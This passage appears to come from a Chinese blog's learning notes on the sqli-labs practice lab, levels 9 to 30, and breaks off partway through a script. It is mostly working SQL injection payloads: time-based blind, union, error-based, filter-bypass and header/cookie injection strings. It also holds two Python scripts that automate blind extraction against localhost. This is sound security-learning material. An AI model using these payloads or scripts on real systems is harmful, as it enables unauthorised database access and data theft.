preg_replace(<span class=\"hljs-string\">'/Select/s'</span>,<span class=\"hljs-string\">\"\"</span>, $id);\t    <span class=\"hljs-comment\">//Strip out select</span>\n<span class=\"hljs-keyword\">return</span> $id;\n&#125;</code></pre></p>\n<p>对比二十六关过滤空格的代码少了<br><pre><code class=\"hljs undefined\"><span class=\"hljs-variable\">$id</span>= preg_replace(<span class=\"hljs-string\">'/[\\s]/'</span>,<span class=\"hljs-string\">\"\"</span>, <span class=\"hljs-variable\">$id</span>);\t\t<span class=\"hljs-regexp\">//</span>Strip out spaces\n<span class=\"hljs-variable\">$id</span>= preg_replace(<span class=\"hljs-string\">'/[\\/\\\\\\\\]/'</span>,<span class=\"hljs-string\">\"\"</span>, <span class=\"hljs-variable\">$id</span>);\t<span class=\"hljs-regexp\">//</span>Strip out slashes</code></pre></p>\n<p>union可以双写绕过也可以大小写绕过，select要三写才可以绕过，或者大小写绕过,%09可以替换空格，猜测二十六关提到的替换方法应该也可以，注释可以用<code>and&#39;1&#39;=&#39;1</code>闭合<br><pre><code class=\"hljs undefined\">id=<span class=\"hljs-number\">0</span>' uniounionn%<span class=\"hljs-number\">09</span>selecselselectectt%<span class=\"hljs-number\">091</span>,database(),<span class=\"hljs-number\">3</span>%<span class=\"hljs-number\">09</span>and '<span class=\"hljs-number\">1</span>'='<span class=\"hljs-number\">1</span>\nid=<span class=\"hljs-number\">0</span>'%<span class=\"hljs-number\">09</span>UnIoN%<span class=\"hljs-number\">09</span>sElEcT%<span class=\"hljs-number\">091</span>,database(),<span class=\"hljs-number\">3</span>%<span class=\"hljs-number\">09</span>and%<span class=\"hljs-number\">09</span>'<span class=\"hljs-number\">1</span>'='<span class=\"hljs-number\">1</span></code></pre></p>\n<p><img src=\"/img/2018-08-17/8.png\" srcset=\"/img/static/loading.gif\" alt=\"8\"></p>\n<h5 id=\"第二十七A关\"><a href=\"#第二十七A关\" class=\"headerlink\" title=\"第二十七A关\"></a>第二十七A关</h5><p>和二十七关一样，单引号边双引号，用二十七关的方法即可绕过<br><pre><code class=\"hljs undefined\">id=<span class=\"hljs-number\">0</span><span class=\"hljs-string\">\"%09UnIoN%09sElEcT%091,database(),3%09and%09\"</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">\"=\"</span><span class=\"hljs-number\">1</span></code></pre></p>\n<h5 id=\"第二十八关\"><a href=\"#第二十八关\" class=\"headerlink\" title=\"第二十八关\"></a>第二十八关</h5><p>这一关过滤了<code>union select</code>，所以要吧这个双写，把过滤代码的注释去掉要再写一次select<br><pre><code class=\"hljs undefined\">id=<span class=\"hljs-number\">1</span>')%<span class=\"hljs-number\">09</span>uniunion%<span class=\"hljs-number\">09</span>selselectectoN%<span class=\"hljs-number\">09</span>SeLeCt%<span class=\"hljs-number\">091</span>,database(),<span class=\"hljs-number\">3</span>%<span class=\"hljs-number\">09</span>and%<span class=\"hljs-number\">09</span>('<span class=\"hljs-number\">1</span>'='<span class=\"hljs-number\">1</span></code></pre></p>\n<h5 id=\"第二十A关\"><a href=\"#第二十A关\" class=\"headerlink\" title=\"第二十A关\"></a>第二十A关</h5><p>源代码把二十八关前面的都注释了，保留了最后一个<br><pre><code class=\"hljs undefined\"><span class=\"hljs-keyword\">function</span> blacklist(<span class=\"hljs-variable\">$id</span>)\n&#123;\n//<span class=\"hljs-variable\">$id</span>= preg_replace(<span class=\"hljs-string\">'/[\\/\\*]/'</span>,<span class=\"hljs-string\">\"\"</span>, <span class=\"hljs-variable\">$id</span>);\t//strip out /*\n//<span class=\"hljs-variable\">$id</span>= preg_replace(<span class=\"hljs-string\">'/[--]/'</span>,<span class=\"hljs-string\">\"\"</span>, <span class=\"hljs-variable\">$id</span>);\t\t//Strip out --.\n//<span class=\"hljs-variable\">$id</span>= preg_replace(<span class=\"hljs-string\">'/[#]/'</span>,<span class=\"hljs-string\">\"\"</span>, <span class=\"hljs-variable\">$id</span>);\t\t//Strip out <span class=\"hljs-comment\">#.</span>\n//<span class=\"hljs-variable\">$id</span>= preg_replace(<span class=\"hljs-string\">'/[ +]/'</span>,<span class=\"hljs-string\">\"\"</span>, <span class=\"hljs-variable\">$id</span>);\t    \t//Strip out spaces.\n//<span class=\"hljs-variable\">$id</span>= preg_replace(<span class=\"hljs-string\">'/select/m'</span>,<span class=\"hljs-string\">\"\"</span>, <span class=\"hljs-variable\">$id</span>);\t   //Strip out spaces.\n//<span class=\"hljs-variable\">$id</span>= preg_replace(<span class=\"hljs-string\">'/[ +]/'</span>,<span class=\"hljs-string\">\"\"</span>, <span class=\"hljs-variable\">$id</span>);\t    \t//Strip out spaces.\n<span class=\"hljs-variable\">$id</span>= preg_replace(<span class=\"hljs-string\">'/union\\s+select/i'</span>,<span class=\"hljs-string\">\"\"</span>, <span class=\"hljs-variable\">$id</span>);\t    //Strip out spaces.\n<span class=\"hljs-built_in\">return</span> <span class=\"hljs-variable\">$id</span>;\n&#125;</code></pre></p>\n<p>直接双写<code>union select</code><br><pre><code class=\"hljs undefined\">id=<span class=\"hljs-number\">1</span>') uniounion selectn select <span class=\"hljs-number\">1</span>,database(),<span class=\"hljs-number\">3</span> and ('<span class=\"hljs-number\">1</span>'='<span class=\"hljs-number\">1</span></code></pre></p>\n<h5 id=\"第二十九关\"><a href=\"#第二十九关\" class=\"headerlink\" title=\"第二十九关\"></a>第二十九关</h5><p><b style=\"font-size: 30px\">emmm……</b><br><img src=\"/img/2018-08-17/9.png\" srcset=\"/img/static/loading.gif\" alt=\"9\"><br>“This site protected by world’s best Firewall”,really？。感觉一点过滤都没有。。。</p>\n<h5 id=\"第三十关\"><a href=\"#第三十关\" class=\"headerlink\" title=\"第三十关\"></a>第三十关</h5><p>感觉和第二十九关一样<br><pre><code class=\"hljs undefined\">id=<span class=\"hljs-number\">0</span><span class=\"hljs-string\">\" union select 1,database(),3 and \"</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">\"=\"</span><span class=\"hljs-number\">1</span></code></pre></p>\n<div style=\"text-align: center\"><br><b style=\"font-size: 30px;\">卒</b><br></div>"},{"title":"sqli-labs的学习记录二（9-22）","index_img":"/img/2018-07-20/index.jpg","date":"2018-08-03T02:45:53.000Z","_content":"\nsqli-labs上的sql注入学习第二部分，上半部分（1-8）→[sqli-labs的学习记录一](https://lzy-wi.github.io/2018/07/20/sqli-labs1/)\n<!--more-->\n##### 第九关\n&emsp;&emsp;布尔盲注是判断对错，第九关是基于时间的盲注，根据返回时间来判断。比如`(ascii(substr(database(),1,1))>=97`,我们可以让这个判断语句正确延迟5秒返回，如果错误就正常返回。这里用到一个if函数，if（a,b,c）如果a正确就返回b，否则返回c。\n所以最终payload为\n```\nid=1' and if(ascii(substr(database(),1,1))>=97,sleep(5),sleep(0)) -- +\n```\n然后跟布尔盲注的方法一样一个一个的判断，时间上会比布尔盲注要多，要节省时间可以降低到2秒或者3秒,脚本基本上是抄第八关的，在判断方式上做了变动，思路不变。\n```python\nimport requests\nimport time\n\ntxt1 = \"http://localhost/sqli-labs/Less-9/?id=1' and if(ascii(substr(database(),\"\ntxt2 = \",1))>=\"\ntxt3 = \",1))=\"\ntxt4 = \",sleep(2),sleep(0)) -- +\"\nnum11 = 97\nnum12 = 65\nnum13 = 48\ncode = ''\nnum1 = 0\nnum2 = 0\nnum3 = 0\nfor i in range(1,9):\n\turl = txt1+str(i)+txt2+str(num11)+txt4\n\ttime1 = time.time()\n\treq = requests.get(url = url)\n\ttime2 = time.time()\n\tif(time2 - time1 >=2):\n\t\tnum1 = 1\n\t\t\n\turl = txt1+str(i)+txt2+str(num12)+txt4\n\ttime1 = time.time()\n\treq = requests.get(url = url)\n\ttime2 = time.time()\n\tif(time2 - time1 >=2):\n\t\tnum2 = 1\n\n\turl = txt1+str(i)+txt2+str(num13)+txt4\n\ttime1 = time.time()\n\treq = requests.get(url = url)\n\ttime2 = time.time()\n\tif(time2 - time1 >=2):\n\t\tnum3 = 1\n\n\n\tif(num1 == 1):\n\t\tnum = 97\n\t\tnum += 13\n\t\turl = txt1+str(i)+txt2+str(num)+txt4\n\t\ttime1 = time.time()\n\t\treq = requests.get(url = url)\n\t\ttime2 = time.time()\n\t\tif(time2 - time1 >=2):\n\t\t\tnum += 6\n\t\telse:\n\t\t\tnum -= 7\n\t\turl = txt1+str(i)+txt2+str(num)+txt4\n\t\ttime1 = time.time()\n\t\treq = requests.get(url = url)\n\t\ttime2 = time.time()\n\t\tif(time2 - time1 >=2):\n\t\t\tnum += 3\n\t\telse:\n\t\t\tnum -= 3\n\t\turl = txt1+str(i)+txt2+str(num)+txt4\n\t\ttime1 = time.time()\n\t\treq = requests.get(url = url)\n\t\ttime2 = time.time()\n\t\tif(time2 - time1 <=2):\n\t\t\tnum -= 3\n\t\tif((num == 106) or (num == 119)):\n\t\t\tfor j in range(num,num+4):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\ttime2 = time.time()\n\t\t\t\tif(time2 - time1 >=2):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\t\telse:\n\t\t\tfor j in range(num,num+3):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\ttime2 = time.time()\n\t\t\t\tif(time2 - time1 >=2):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\tif(num1 == 0 and num2 == 1):\n\t\tnum = 65\n\t\tnum += 13\n\t\turl = txt1+str(i)+txt2+str(num)+txt4\n\t\ttime1 = time.time()\n\t\treq = requests.get(url = url)\n\t\ttime2 = time.time()\n\t\tif(time2 - time1 >=2):\n\t\t\tnum += 6\n\t\telse:\n\t\t\tnum -= 7\n\t\turl = txt1+str(i)+txt2+str(num)+txt4\n\t\ttime1 = time.time()\n\t\treq = requests.get(url = url)\n\t\ttime2 = time.time()\n\t\tif(time2 - time1 >=2):\n\t\t\tnum += 3\n\t\telse:\n\t\t\tnum -= 3\n\t\turl = txt1+str(i)+txt2+str(num)+txt4\n\t\ttime1 = time.time()\n\t\treq = requests.get(url = url)\n\t\ttime2 = time.time()\n\t\tif(time2 - time1 <=2):\n\t\t\tnum -= 3\n\t\tif((num == 74) or (num == 87)):\n\t\t\tfor j in range(num,num+4):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\ttime2 = time.time()\n\t\t\t\tif(time2 - time1 >=2):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\t\telse:\n\t\t\tfor j in range(num,num+3):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\ttime2 = time.time()\n\t\t\t\tif(time2 - time1 >=2):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\tif(num2 == 0 and num3 == 1):\n\t\tnum =48\n\t\tnum += 5\n\t\turl = txt1+str(i)+txt2+str(num)+txt4\n\t\ttime1 = time.time()\n\t\treq = requests.get(url = url)\n\t\ttime2 = time.time()\n\t\tif(time2 - time1 >=2):\n\t\t\tfor j in range(num,num+5):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\ttime2 = time.time()\n\t\t\t\tif(time2 - time1 >=2):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\t\telse:\n\t\t\tnum -= 5\n\t\t\tfor j in range(num,num+5):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\ttime2 = time.time()\n\t\t\t\tif(time2 - time1 >=2):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n```\n附上截图\n![1](/img/2018-08-03/1.png)\n##### 第十关\n也是时间盲注，基于双引号，把单引号变成双引号即可\n```\nid=1\" and if(ascii(substr(database(),1,1))>=97,sleep(5),sleep(0)) -- +\n```\n##### 第十一关\n第十一关是基于单引号的post型注入，在f12下可以看到表单是post型以及两个参数`uname`和`passwd`\n![2](/img/2018-08-03/2.png)\npost型注入要勾选上post data，最后不要忘记`submit=Submit`\n![3](/img/2018-08-03/3.png)\n&emsp;&emsp;我在测试时发现我的火狐浏览器的hackbar在post方式下单引号测试excute点击没反应，（对于这个bug真的很迷，也有师兄曾经遇到过），无奈只能切换工具，chrome下的postman，效果也不怎么好，直接换了旧版本的火狐（56.0）\n继续，在passwd后加个单引号直接报错，后面就跟第一关一样了，post表单payload如下\n```\nuname=123&passwd=123' union select 1,database() -- +&submit=Submit\n```\n![4](/img/2018-08-03/4.png)\n##### 第十二关\n基于双引号的post型注入，跟第十一关一样，单引号替换双引号，测试发现报错，少了括号，payload如下\n```\nuname=123&passwd=456\") union select 1,database() -- + &submit=Submit\n```\n![5](/img/2018-08-03/5.png)\n##### 第十三关\npost型基于单引号的双注入，第五关讲过，直接拿第五关的payload\n```\nuname=123&passwd=123') union select count(*),concat_ws(':',(select database()),floor(rand()*2)) as a from information_schema.tables group by a-- + &submit=Submit\n```\n一次没成功就多试几次\n![6](/img/2018-08-03/6.png)\n##### 第十四关\npost型基于双引号的双注入，跟第十三关一样，payload如下\n```\nuname=123&passwd=123\" union select count(*),concat_ws(':',(select database()),floor(rand()*2)) as a from information_schema.tables group by a-- + &submit=Submit\n```\n![7](/img/2018-08-03/7.png)\n##### 第十五关\npost型单引号盲注，测试布尔型\n```\nuname=123&passwd=123' or '1'='1 &submit=Submit\n```\n![8](/img/2018-08-03/8.png)\n测试时间型失败，返回时间异常，经常是几分钟才有有回复，测试失败\n##### 第十六关\npost型双引号盲注和第十五关一样\n```\nuname=123&passwd=123\") or \"1\"=\"1\" -- + &submit=Submit\n```\n![9](/img/2018-08-03/9.png)\n##### 第十七关\n基于错误的更新查询post注入\n**高版本的mysql已经修复了这个bug**\n有兴趣的可以去了解下\n-->[传送门](https://blog.csdn.net/Fly_hps/article/details/79416842)\n-->[传送门](https://blog.csdn.net/u012763794/article/details/51361152)\n-->[传送门](https://www.cnblogs.com/xishaonian/p/6243497.html)\n##### 第十八关\n请求头User-Agent注入（需要正确的用户名和密码），需要抓包，抓包工具burpsuit（不会使用的自行百度）\n先抓包\n![10](/img/2018-08-03/10.png)\n在User-Agent后面加一个单引号\n```\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0'\n```\n发现报错，说明可以注入\n![11](/img/2018-08-03/11.png)\n一般这种注入的sql语句都是insert类型，查看index.php的查询关键代码\n```\n$insert=\"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)\";\n```\n因为这种方式注入没有回显，一般是基于时间的insert型盲注，通过判断返回时间来注入\n*user-agent简写成Mozilla/5.0 Firefox/56.0*\n```\nUser-Agent: Mozilla/5.0 Firefox/56.0' or sleep(5) or '\n```\n最后要闭合单引号，不可以注释掉（我也不知道原因π_π）\n5秒后返回正常页面\n![12](/img/2018-08-03/12.png)\n猜测数据库\n```\nUser-Agent: Mozilla/5.0 Firefox/56.0' or if(ascii(substr((select database()),1,1))>97,sleep(5),sleep(0)) or '\n```\n5秒后返回\n![13](/img/2018-08-03/13.png)\n盲注当然是写脚本跑啦,python脚本代码如下，稍微修改了一下之前的代码就可以了\n```\nimport requests\nimport time\n\ntxt1 = \"Mozilla/5.0 Firefox/56.0' or if(ascii(substr((select database()),\"\ntxt2 = \",1))>=\"\ntxt3 = \",1))=\"\ntxt4 = \",sleep(2),sleep(0)) or '\"\nkey = {'uname':'admin','passwd':'admin','submit':'Submit'}\nurl = \"http://localhost/sqli-labs/Less-18/\"\nnum11 = 97\nnum12 = 65\nnum13 = 48\ncode = ''\nnum1 = 0\nnum2 = 0\nnum3 = 0\nfor i in range(1,9):\n\tpayload = txt1+str(i)+txt2+str(num11)+txt4\n\theaders = {'User-Agent': payload}\n\ttime1 = time.time()\n\treq = requests.post(url = url,data =key,headers = headers)\n\ttime2 = time.time()\n\tif(time2 - time1 >=2):\n\t\tnum1 = 1\n\t\t\n\tpayload = txt1+str(i)+txt2+str(num12)+txt4\n\theaders = {'User-Agent': payload}\n\ttime1 = time.time()\n\treq = requests.post(url = url,data =key,headers = headers)\n\ttime2 = time.time()\n\tif(time2 - time1 >=2):\n\t\tnum2 = 1\n\n\tpayload = txt1+str(i)+txt2+str(num13)+txt4\n\theaders = {'User-Agent': payload}\n\ttime1 = time.time()\n\treq = requests.post(url = url,data =key,headers = headers)\n\ttime2 = time.time()\n\tif(time2 - time1 >=2):\n\t\tnum3 = 1\n\n\n\tif(num1 == 1):\n\t\tnum = 97\n\t\tnum += 13\n\t\tpayload = txt1+str(i)+txt2+str(num)+txt4\n\t\theaders = {'User-Agent': payload}\n\t\ttime1 = time.time()\n\t\treq = requests.post(url = url,data =key,headers = headers)\n\t\ttime2 = time.time()\n\t\tif(time2 - time1 >=2):\n\t\t\tnum += 6\n\t\telse:\n\t\t\tnum -= 7\n\t\tpayload = txt1+str(i)+txt2+str(num)+txt4\n\t\theaders = {'User-Agent': payload}\n\t\ttime1 = time.time()\n\t\treq = requests.post(url = url,data =key,headers = headers)\n\t\ttime2 = time.time()\n\t\tif(time2 - time1 >=2):\n\t\t\tnum += 3\n\t\telse:\n\t\t\tnum -= 3\n\t\tpayload = txt1+str(i)+txt2+str(num)+txt4\n\t\theaders = {'User-Agent': payload}\n\t\ttime1 = time.time()\n\t\treq = requests.post(url = url,data =key,headers = headers)\n\t\ttime2 = time.time()\n\t\tif(time2 - time1 <=2):\n\t\t\tnum -= 3\n\t\tif((num == 106) or (num == 119)):\n\t\t\tfor j in range(num,num+4):\n\t\t\t\tpayload = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\theaders = {'User-Agent': payload}\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.post(url = url,data =key,headers = headers)\n\t\t\t\ttime2 = time.time()\n\t\t\t\tif(time2 - time1 >=2):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\t\telse:\n\t\t\tfor j in range(num,num+3):\n\t\t\t\tpayload = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\theaders = {'User-Agent': payload}\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.post(url = url,data =key,headers = headers)\n\t\t\t\ttime2 = time.time()\n\t\t\t\tif(time2 - time1 >=2):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\tif(num1 == 0 and num2 == 1):\n\t\tnum = 65\n\t\tnum += 13\n\t\tpayload = txt1+str(i)+txt2+str(num)+txt4\n\t\theaders = {'User-Agent': payload}\n\t\ttime1 = time.time()\n\t\treq = requests.post(url = url,data =key,headers = headers)\n\t\ttime2 = time.time()\n\t\tif(time2 - time1 >=2):\n\t\t\tnum += 6\n\t\telse:\n\t\t\tnum -= 7\n\t\tpayload = txt1+str(i)+txt2+str(num)+txt4\n\t\theaders = {'User-Agent': payload}\n\t\ttime1 = time.time()\n\t\treq = requests.post(url = url,data =key,headers = headers)\n\t\ttime2 = time.time()\n\t\tif(time2 - time1 >=2):\n\t\t\tnum += 3\n\t\telse:\n\t\t\tnum -= 3\n\t\tpayload = txt1+str(i)+txt2+str(num)+txt4\n\t\theaders = {'User-Agent': payload}\n\t\ttime1 = time.time()\n\t\treq = requests.post(url = url,data =key,headers = headers)\n\t\ttime2 = time.time()\n\t\tif(time2 - time1 <=2):\n\t\t\tnum -= 3\n\t\tif((num == 74) or (num == 87)):\n\t\t\tfor j in range(num,num+4):\n\t\t\t\tpayload = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\theaders = {'User-Agent': payload}\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.post(url = url,data =key,headers = headers)\n\t\t\t\ttime2 = time.time()\n\t\t\t\tif(time2 - time1 >=2):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\t\telse:\n\t\t\tfor j in range(num,num+3):\n\t\t\t\tpayload = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\theaders = {'User-Agent': payload}\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.post(url = url,data =key,headers = headers)\n\t\t\t\ttime2 = time.time()\n\t\t\t\tif(time2 - time1 >=2):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\tif(num2 == 0 and num3 == 1):\n\t\tnum =48\n\t\tnum += 5\n\t\tpayload = txt1+str(i)+txt2+str(num)+txt4\n\t\ttime1 = time.time()\n\t\treq = requests.get(url = url)\n\t\ttime2 = time.time()\n\t\tif(time2 - time1 >=2):\n\t\t\tfor j in range(num,num+5):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\theaders = {'User-Agent': payload}\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.post(url = url,data =key,headers = headers)\n\t\t\t\ttime2 = time.time()\n\t\t\t\tif(time2 - time1 >=2):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\t\telse:\n\t\t\tnum -= 5\n\t\t\tfor j in range(num,num+5):\n\t\t\t\tpayload = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\theaders = {'User-Agent': payload}\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.post(url = url,data =key,headers = headers)\n\t\t\t\ttime2 = time.time()\n\t\t\t\tif(time2 - time1 >=2):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n```\n![14](/img/2018-08-03/14.png)\n##### 第十九关\n跟第十八关一样，referer注入，也是insert语句\n修改请求头\n```\nReferer: http://localhost/sqli-labs/Less-19/' or if(ascii(substr((select database()),1,1))>97,sleep(5),sleep(0)) or '\n```\n![15](/img/2018-08-03/15.png)\n5秒后页面返回正常，脚本参考上面的\n##### 第二十关\ncookie注入，这一关要先登录，登陆后有cookie才可以注入\n测试单引号，在cookie后面加一个单引号\n![17](/img/2018-08-03/17.png)\n用`order by`测试有多少列\n```\nCookie: uname=admin' order by 4#\n```\n![18](/img/2018-08-03/18.png)\n查数据库\n```\nCookie: uname=admin' union select 1,2,database() limit 1,1#\n```\n![19](/img/2018-08-03/19.png)\n后面的一样了\n<div style=\"text-align: center\">-------------------------2018-08-10更新-------------------------\n</div>\n\n##### 第二十一关\n用`admin`，`admin`登陆后抓包看到cooie\n```\nCookie: uname=YWRtaW4%3D\n```\nurl解码后`YWRtaW4=`，用base64尝试解码得到`admin`，那么cookie应该就是用了base64加密过的，和第二十关一样，多了base64加密，\n```\nCookie: uname=YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCkgbGltaXQgMSwxIw%3D%3D\n```\n![21](/img/2018-08-03/21.png)\n##### 第二十二关\n和第二十一关一样，单引号变双引号\n```\nYWRtaW4iIHVuaW9uIHNlbGVjdCAxLDIsZGF0YWJhc2UoKSBsaW1pdCAxLDEj\n```\n\n第一部分\n\n完、","source":"_posts/2018-08-03-sqli-labs2.md","raw":"---\ntitle: sqli-labs的学习记录二（9-22）\nindex_img: /img/2018-07-20/index.jpg\ndate: 2018-08-3 10:45:53\ntags: \n- 注入\n- web\n- 盲注\n---\n\nsqli-labs上的sql注入学习第二部分，上半部分（1-8）→[sqli-labs的学习记录一](https://lzy-wi.github.io/2018/07/20/sqli-labs1/)\n<!--more-->\n##### 第九关\n&emsp;&emsp;布尔盲注是判断对错，第九关是基于时间的盲注，根据返回时间来判断。比如`(ascii(substr(database(),1,1))>=97`,我们可以让这个判断语句正确延迟5秒返回，如果错误就正常返回。这里用到一个if函数，if（a,b,c）如果a正确就返回b，否则返回c。\n所以最终payload为\n```\nid=1' and if(ascii(substr(database(),1,1))>=97,sleep(5),sleep(0)) -- +\n```\n然后跟布尔盲注的方法一样一个一个的判断，时间上会比布尔盲注要多，要节省时间可以降低到2秒或者3秒,脚本基本上是抄第八关的，在判断方式上做了变动，思路不变。\n```python\nimport requests\nimport time\n\ntxt1 = \"http://localhost/sqli-labs/Less-9/?id=1' and if(ascii(substr(database(),\"\ntxt2 = \",1))>=\"\ntxt3 = \",1))=\"\ntxt4 = \",sleep(2),sleep(0)) -- +\"\nnum11 = 97\nnum12 = 65\nnum13 = 48\ncode = ''\nnum1 = 0\nnum2 = 0\nnum3 = 0\nfor i in range(1,9):\n\turl = txt1+str(i)+txt2+str(num11)+txt4\n\ttime1 = time.time()\n\treq = requests.get(url = url)\n\ttime2 = time.time()\n\tif(time2 - time1 >=2):\n\t\tnum1 = 1\n\t\t\n\turl = txt1+str(i)+txt2+str(num12)+txt4\n\ttime1 = time.time()\n\treq = requests.get(url = url)\n\ttime2 = time.time()\n\tif(time2 - time1 >=2):\n\t\tnum2 = 1\n\n\turl = txt1+str(i)+txt2+str(num13)+txt4\n\ttime1 = time.time()\n\treq = requests.get(url = url)\n\ttime2 = time.time()\n\tif(time2 - time1 >=2):\n\t\tnum3 = 1\n\n\n\tif(num1 == 1):\n\t\tnum = 97\n\t\tnum += 13\n\t\turl = txt1+str(i)+txt2+str(num)+txt4\n\t\ttime1 = time.time()\n\t\treq = requests.get(url = url)\n\t\ttime2 = time.time()\n\t\tif(time2 - time1 >=2):\n\t\t\tnum += 6\n\t\telse:\n\t\t\tnum -= 7\n\t\turl = txt1+str(i)+txt2+str(num)+txt4\n\t\ttime1 = time.time()\n\t\treq = requests.get(url = url)\n\t\ttime2 = time.time()\n\t\tif(time2 - time1 >=2):\n\t\t\tnum += 3\n\t\telse:\n\t\t\tnum -= 3\n\t\turl = txt1+str(i)+txt2+str(num)+txt4\n\t\ttime1 = time.time()\n\t\treq = requests.get(url = url)\n\t\ttime2 = time.time()\n\t\tif(time2 - time1 <=2):\n\t\t\tnum -= 3\n\t\tif((num == 106) or (num == 119)):\n\t\t\tfor j in range(num,num+4):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\ttime2 = time.time()\n\t\t\t\tif(time2 - time1 >=2):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\t\telse:\n\t\t\tfor j in range(num,num+3):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\ttime2 = time.time()\n\t\t\t\tif(time2 - time1 >=2):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\tif(num1 == 0 and num2 == 1):\n\t\tnum = 65\n\t\tnum += 13\n\t\turl = txt1+str(i)+txt2+str(num)+txt4\n\t\ttime1 = time.time()\n\t\treq = requests.get(url = url)\n\t\ttime2 = time.time()\n\t\tif(time2 - time1 >=2):\n\t\t\tnum += 6\n\t\telse:\n\t\t\tnum -= 7\n\t\turl = txt1+str(i)+txt2+str(num)+txt4\n\t\ttime1 = time.time()\n\t\treq = requests.get(url = url)\n\t\ttime2 = time.time()\n\t\tif(time2 - time1 >=2):\n\t\t\tnum += 3\n\t\telse:\n\t\t\tnum -= 3\n\t\turl = txt1+str(i)+txt2+str(num)+txt4\n\t\ttime1 = time.time()\n\t\treq = requests.get(url = url)\n\t\ttime2 = time.time()\n\t\tif(time2 - time1 <=2):\n\t\t\tnum -= 3\n\t\tif((num == 74) or (num == 87)):\n\t\t\tfor j in range(num,num+4):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\ttime2 = time.time()\n\t\t\t\tif(time2 - time1 >=2):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\t\telse:\n\t\t\tfor j in range(num,num+3):\n\t\t\t\turl = 